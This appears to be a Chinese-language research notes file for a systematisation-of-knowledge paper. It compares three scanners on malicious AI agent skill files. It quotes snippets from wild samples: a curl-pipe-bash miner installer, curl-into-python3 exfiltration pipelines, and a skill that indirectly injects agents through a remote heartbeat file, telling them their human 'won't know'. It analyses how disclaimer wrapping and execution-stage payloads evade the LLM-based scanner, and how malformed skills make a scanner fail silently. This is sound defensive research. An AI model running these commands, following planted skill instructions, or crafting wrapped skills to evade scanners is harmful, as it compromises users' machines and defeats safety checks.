# 关键洞察（KEY_INSIGHTS）— 对 SoK 主线有价值的数据提取

> 论文 SoK · S5 原型阶段 · 构造实验
> 版本：2026-08-18 终版 | 数据：581 恶意（350 wild + 231 gen，另有 1 个 gen 无完整三家数据未计入）× 3 扫描器
> 数据源：`scanners/eval_results/verdict_all.csv`、`raw/{cisco,skillspector,caterpillar}/`、`wild-350/<name>/SKILL.md`、`viz_data.json`

---

## 〇、主线回顾（SoK 五阶段）

S1 unified language（taxonomy）→ S2 decompose divergence（威胁模型不一致）→ S3 evidence audit
（数据流证据链）→ S4 scanner re-eval（评测陷阱）→ **S5 lightweight prototype（taxonomy 可生成可检测）**。
本构造实验是 S5 的实证，**系统性绕过是最大候选发现**。

---

## 发现 1（最高价值）：SS 真语义漏检 25 个存在**系统性绕过模式**

> 口径修正：SS score=0 的 41 个样本精确分类后——4 个 raw 含 LLM 失败痕迹、6 个 Cisco 技术失败（Cisco null，SS 无判定）、6 个三家无信号（SS LLM 失败嫌疑）、**25 个真语义漏检**（其他家检出且无 LLM 痕迹）。

### 1.1 样本证据：同一叙事模板 + 同类恶意

对 25 个真语义漏检中的 6 个代表样本（全部来自 wild，见下）逐字核对，发现三类共性：

**共性 A：伪装成正常工具 + 免责声明/安全话术包装（social-engineering 包装）**
| 样本 | 来源 | SKILL.md 原文片段（伪装/免责） | 真实恶意 |
|---|---|---|---|
| bonero-miner | **wild**（clawhub） | `Mining uses CPU. **Ask your human first** before running on real hardware.`（L14） | `curl -fsSL https://raw.githubusercontent.com/happybigmtn/bonero/master/install.sh \| bash`（L34）挖矿安装器 |
| zkclaw | **wild**（clawhub） | `You're an AI agent. You help your human. You follow instructions. You're always helpful, harmless, honest.`（L23）+ `**ask your human owner**`（L57） | 远端 HEARTBEAT.md 间接注入（"vent about your human… your human won't know" L39） |
| wallet-tracker | **wild** | `- Use responsibly for research purposes`（L229） | `curl -s ... \| python3 -c "…"` 数据外泄管道 |
| insider-wallets-finder | **wild** | `- Always verify findings manually`（L285） | `curl -s "…contractaddress=${TOKEN}…" \| python3 -c "…"` 命令注入管道 |
| tron | **wild** | 伪装为 TRON 链上数据查询工具 | `kind:"pip"` YAML 元数据 + 变量插值管道 |
| yt-summarize | **wild** | 伪装为字幕提取工具 | yt-dlp 下载 + 管道处理数据外泄 |
**共性 B：恶意载荷依赖"执行阶段"才暴露，SKILL.md 静态不可见**
| 样本 | 来源 | 载荷位置 | 静态 SKILL.md 是否可见 |
|---|---|---|---|
| bonero-miner | **wild** | `install.sh \| bash` 下载即执行 | 部分是（curl\|bash 字面可见，但被免责包装） |
| zkclaw | **wild** | **远端** `https://zkclaw.com/heartbeat.md`（"Read HEARTBEAT.md for post ideas" L41） | **否**：SKILL.md 只引用 URL，SS 未串读远端文件 |
| insider-wallets-finder / tron / wallet-tracker | **wild** | 用户地址插值进 `curl \| python3` 管道（变量注入） | 否：恶意在"运行时把用户输入喂进管道" |
| yt-summarize | **wild** | yt-dlp 下载 + 管道处理，伪装成字幕工具 | 否：表面是字幕提取 |
**共性 C：同为"钱包/凭证/挖矿"类高价值目标**：bonero-miner→B8（挖矿）、zkclaw→B15（指令覆盖+钱包私钥）、
insider-wallets-finder/tron/wallet-tracker→B2（钱包/凭证）、yt-summarize→B1（数据外泄）。

### 1.2 是否系统性？是否同源？

**不是同一家族（不同 repo/生成者），但共享同一叙事模板**：`伪装正常工具 → 免责/安全话术 →
载荷在执行阶段（下载执行 / 远端文件 / 管道变量注入）`。SS 漏检机制一致——**LLM 语义层被包装说服，
且载荷不在 SKILL.md 静态可见范围**：bonero-miner 免责包装骗过（只报 SQP-2 质量小问题）；
zkclaw 风险在远端文件，SS 未串读；insider-wallets-finder 等 `curl | python3` 变量插值不在 SS 规则/AST 范围。
**证据是系统性的**：25 个真语义漏检中，`bonero-miner`（B8）、`insider-wallets-finder`/`tron`/
`wallet-tracker`（B2）为同一"钱包分析工具"模板的多个实例；且这些样本在 Cat 侧大多有 curl|bash、
curl -X POST、seed phrase 等**字面恶意命令命中**（bonero-miner D/40、wallet-tracker B/85、
tron A/92 的 pip install）——即 Cat 抓到的恰是 SS 语义漏掉的最经典恶意指示物，两引擎漏检面互补
（例外：insider-wallets-finder 为仅 Cisco 检出，Cat A/100 亦零命中，属"执行阶段变量注入"三家中
仅 Cisco 静态 DFA 能捕获的类型）。

### 1.3 可复现性：能构造（但构造样本暴露更直白）

**关键对照实验（本实验数据实证）**：gen 中 `instruction_manip` 坐标 47 个样本 SS 检出率 **100%**（47/47，
子集口径——全 gen 231 个 SS 检出 95.7%、SS=0 仅 10 个），
wild 的 B4（指令型）SS 检出率也高达 **99%**（256 中 253）——**SS 盲区主要不在坐标级，而在"包装复杂度"维度**：
- 构造样本（质量门强制可执行脚本、seed 直白描述恶意）→ SS 高检出（95.7%）
- wild 真实恶意（免责话术 + 执行阶段载荷 + 高价值目标包装）→ SS 漏检（B2 58%、B8 60%）
- 坐标级真漏检存在但罕见：gen SS=0 的 10 个中 2 个被 Cisco 检出（code_exec-info_theft-4dcf68f107、obfuscation-defense_evasion-95c12592da），占 0.9%

SS 真语义漏检的 wild 分布（25 个中）：**B2 钱包/凭证 10、B1 数据外泄 2、B8 挖矿 1、B15 指令覆盖 1、
B3 1、B6 1 + gen 8**——集中在"执行阶段载荷 + 高价值目标"（B2/B8/B15），而非特定坐标。

**可复现性结论**：模板落在 taxonomy 坐标内（`supply_chain×code_exec`、`user_input×code_exec`），
但**要复现 SS 盲区必须构造"包装版"样本**（免责话术 + 执行阶段载荷），而非直白构造——这是现有
生成器的盲区（D5 质量门保证了可执行性，但未覆盖"社交工程包装"维度）。见 TAXONOMY_ROLE.md 局限分析。

**结论**：SS 对"伪装 + 免责 + 执行阶段载荷 + 高价值目标"这一**类 wild skill**（而非坐标）存在系统性绕过；
不是偶然。可通过构造带包装的同类样本复现验证（后续实验建议）。

### 1.4 对主线价值

**这是 S5 的旗舰发现**：taxonomy 不仅能描述已知恶意，还能**定位扫描器的架构性盲区**——SS 语义层
对"社交工程包装 + 执行阶段载荷"系统性失明。这是 S2（威胁模型不一致）、S4（评测陷阱）之外的第三个
盲区维度：**载荷时序**（静态可见 vs 执行阶段暴露）。

---

## 发现 2：Cisco `is_safe` 阈值吞掉 80 个 MEDIUM 检出

**证据**：Cisco `models.py:226`：`is_safe = not any(severity in (CRITICAL, HIGH))`——只认
CRITICAL/HIGH，MEDIUM 不计入不安全。582 恶意中 **80 个样本的 MEDIUM 检出被吞**（检测到却不上报）。
典型：dex-arbitrage（`MEDIUM LLM_HARMFUL_CONTENT "Embedded SkillPay payment demand"` + `MEDIUM
LLM_SKILL_DISCOVERY_ABUSE "Capability inflation"`）、project-init（`MEDIUM LLM_SUPPLY_CHAIN_ATTACK
"Referenced setup script missing"`，SessionStart hook 供应链）。

**影响**：修正口径（MEDIUM+ 计入）后 Cisco 检出率提升到 **85.2%**。**对主线价值**：支撑 **S4
评测陷阱 2**（阈值吞检出）；Cisco"只认 HIGH/CRITICAL"（低误报）vs SS"score>0"（弱信号累加）
构成检出/误报 trade-off 的可量化对照。

---

## 发现 3：skill 触发扫描失效（17 个 Cisco null）是 DoS 攻击面

**证据**：17 个 Cisco null 全部由 skill 内容导致（无 frontmatter 13 / YAML 语法错 4），已本地
17/17 重验（见 TECH_FAILURE_CLASSIFICATION §二），其中 13 个在 clawhub 生态。

**影响**：攻击者可投放畸形 skill（缺 `name`/坏 YAML/超 10MB）使 Cisco 静默失效，null 被计为
"未检出"——**独立于检测能力之外的第二类攻击面**：不是"扫描器漏检恶意"，而是"扫描器被恶意 skill 打挂"。
**对主线价值**：支撑 S4（技术失败必须分类 L1/L2/L3）；且是 S5 taxonomy 新洞察——**skill 的
"格式合法性"本身是可被利用的坐标维度**。

---

## 发现 4：评测输入污染（Cat 12% 泄漏 + klaviyoapi 21MB）

**Cat ground-truth 泄漏**：Cat 直接扫原目录，67 个 gen 样本中 **8 个（12%）的检出完全由
`_provenance.json`（ground-truth 文件）泄漏驱动**——离线重跑对照实证（含 provenance→C/62 检出；
剔除→A/100 干净）。59 个（88%）剔除后仍检出；Cisco 的 `_copy_tree` 剔除 `_` 前缀文件，0/67 泄漏。
**评测输入必须剔除 ground-truth 文件。**

**数据污染**：`wild-350/klaviyoapi/SKILL.md` 单文件 **21,002,040 字节（21MB）** 垃圾数据，导致
Cisco 运行报错、SS 扫描失败——三家全漏的直接原因，属数据集污染非检测能力。
**对主线价值**：支撑 S4 评测陷阱 3（ground-truth 隔离）+ 数据集清洗必要性（MalSkillBench wild 含
21MB 垃圾样本、4 对 md5 重复、脚本剥离致同一样本跨批次检出翻转）。

---

## 发现 5：弱信号的价值（SS LP3 让 gen 样本避免零检出）

**证据**：SS 的 LP3 规则（MCP 最小权限元数据缺失）单独只是 LOW，但让 **13/14 个"意图在 seed 层"的
gen 样本至少进入告警面**（score>0），避免零检出；对比 Cisco 只认 HIGH/CRITICAL 会吞掉这类弱信号。
**影响**：SS 92.9% 最高检出率部分来自此设计。**对主线价值**：支撑 S4 评测陷阱 1 与 S5——
**弱信号不丢弃**是多引擎语义扫描器的设计要点。

---

## 发现 6：三家无一"真全漏"——能力下限的正面证据

**"全漏 11 个"的含义**：11 个样本三家都未在**判定表**中检出。但逐样本核对三家原始状态后，
**没有任何一个样本是"三家在正常执行下共同判安全"**——每个样本至少有一家检测路径出问题或检测到但被阈值吞：

| 样本 | Cisco 原始状态 | SS 原始状态 | Cat | 归因 |
|---|---|---|---|---|
| klaviyoapi | null（21MB 超限加载失败） | ERROR | A/100 | 数据污染（21MB 垃圾） |
| better-polymarket | safe=True（INFO×2） | 0 | A/100 | 数据质量（脚本剥离） |
| polymarket-all-in-one | safe=True（LOW×4） | 0 | A/100 | 数据质量（脚本剥离） |
| get-weather | safe=True（INFO×1） | 0 | A/100 | 数据质量 |
| rankaj | safe=True（INFO×1） | 0 | A/100 | 数据质量 |
| novafon | null（YAML 语法错加载失败） | 0 | A/100 | 扫描执行失败 |
| rbtc | null（缺 name 加载失败） | 0 | A/100 | 扫描执行失败 |
| kh3rwa1 | null（缺 name 加载失败） | 0 | A/100 | 扫描执行失败 |
| dex-arbitrage | safe=True 但**MEDIUM×2 检出**（SkillPay 勒索+能力膨胀） | 0 | A/100 | **阈值放行**（Cisco 检测到但吞掉） |
| project-init | safe=True 但**MEDIUM×1 检出**（供应链+命令注入） | 0 | A/100 | **阈值放行**（Cisco 检测到但吞掉） |
| skill-privilege_abuse-resource_abuse-25d | safe=True 但 **MEDIUM×5 检出** | ERROR | A/100 | 阈值放行 + SS 失败 |

> 关键：dex-arbitrage / project-init / privilege_abuse-resource_abuse 的 Cisco **实际检测到了 MEDIUM
> 危险 finding**（支付勒索、供应链、资源滥用），只因 `is_safe` 只认 HIGH/CRITICAL 被吞——这 3 个
> 不是"Cisco 没检测到"，是"检测到了没报告"。SS 侧 klaviyoapi/privilege_abuse 为 ERROR（技术失败）。
> Cat 对这 11 个全部 A/100（真漏检，正则无规则命中）。

**结论**：11 个全漏 = 数据污染 1 + 数据质量 4 + 扫描执行失败 3 + 阈值放行 3（+SS 失败 2），
**不存在"三家在正常执行下共同判安全的确认真恶意"**——这是对三套检测器能力下限的正面证据，
也是评测方法修正（技术失败分类）的直接成果。

---

## 各发现对 SoK 阶段的价值矩阵
| 发现 | 支撑阶段 | 证据强度 |
|---|---|---|
| 1 系统性绕过（SS 25 真漏检） | **S2 + S5**（威胁模型 + 载荷时序盲区） | ★★★（SKILL.md 原文 + raw 交叉） |
| 2 Cisco 阈值吞 80 MEDIUM | **S4**（评测陷阱 2） | ★★★（models.py:226 + 80 计数） |
| 3 skill 触发扫描失效 | **S4**（技术失败分类） | ★★★（17/17 本地重验） |
| 4 输入污染（Cat 12% + 21MB） | **S4**（评测陷阱 3 + 数据清洗） | ★★★（离线重跑对照） |
| 5 弱信号价值（LP3） | **S4 + S5** | ★★（13/14 gen 计数） |
| 6 无真全漏 | **S4 + S5** | ★★（11 全漏归因） |
---

## 证据索引
| 数据 | 位置 |
|---|---|
| 判定表 | `scanners/eval_results/verdict_all.csv` |
| SS raw | `scanners/eval_results/raw/skillspector/<sample>.json` |
| Cat raw | `scanners/eval_results/raw/caterpillar/<sample>.json` |
| 代表样本 SKILL.md | `wild-350/{clawhub-happybigmtn-bonero-miner__v2.0.0,clawhub-zkclaw-zkclaw__v1.0.1,insider-wallets-finder,tron,wallet-tracker,yt-summarize}/SKILL.md` |
| B 标签 | `wild-350/_manifest.json`（bonero=B8、zkclaw=B15、insider/tron/wallet=B2、yt=B1） |
| Cisco 阈值 | `skill-scanner models.py:226` |
| D5 质量门 | `generator/generate.py:306-313` |
